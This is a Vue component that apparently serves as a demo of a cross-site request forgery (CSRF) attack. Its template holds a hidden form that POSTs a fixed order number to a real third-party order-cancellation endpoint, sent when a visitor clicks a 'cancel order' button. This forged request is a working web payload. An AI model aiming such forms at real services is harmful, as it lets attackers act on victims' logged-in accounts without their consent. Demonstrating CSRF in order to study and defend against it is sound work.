<template>
  <div class="CSRF">
     <div class="csrf-info">
      <h2 class="info">CSRF攻击：</h2>
      <img style="width:100px;height:100px;" src="https://teachee-site.oss-ap-south-1.aliyuncs.com/frontend/sites/test/7982151405935329280/jpeg/13_1603872989642_0a5d039e.jpeg
"/>
      <form id="form1" action="https://ocenter.xueersi.com/MyOrderData/ajaxCancelOrder" method=POST>
        <input type="hidden" name="orderNum" value="201028160420001168689925" />
      </form>
     
       <button type="submit" form="form1" value="Submit">取消订单</button>
        <!-- <button @click="cancelOrder">取消订单</button> -->
      <!-- https://ocenter.xueersi.com/MyOrderData/ajaxCancelOrder -->
      <!-- orderNum: 201028005640001662109925 -->
      <div class="info">用户名<input v-model="username"/></div>
      <button @click="login">用户登陆</button>
    </div>
  </div>
</template>
<script>
import api from "@/api"
export default {
  name:'CSRF',
  data(){
    return {
      value:'',
      valueCheck:'',
      commitV:'',
      commitCheck:'',
      username:''
    }
  },
  mounted () {
   
  },
  methods: {
     async cancelOrder () {
    await api.cancelOrder({orderNum:'201028015125001650449925'})
    },
    async login(){
      await api.login({userName:this.username})
    }
  }
}
</script>
<style lang="less">
.CSRF{
  width: 100%;
  min-height: 100vh;
  background-color: #fff;
  text-align: center;
  padding-bottom: 10%;
  input{
    border:1px solid #333;
  }
  .csrf-info{
    background-color: #fff;
    h2{
       color: green;
       font-size: 30px;
       text-align: center;
       margin-bottom: 5%;
       padding-top:10%;
    }
  }
  .info{
    padding:20px;
  }
}



</style>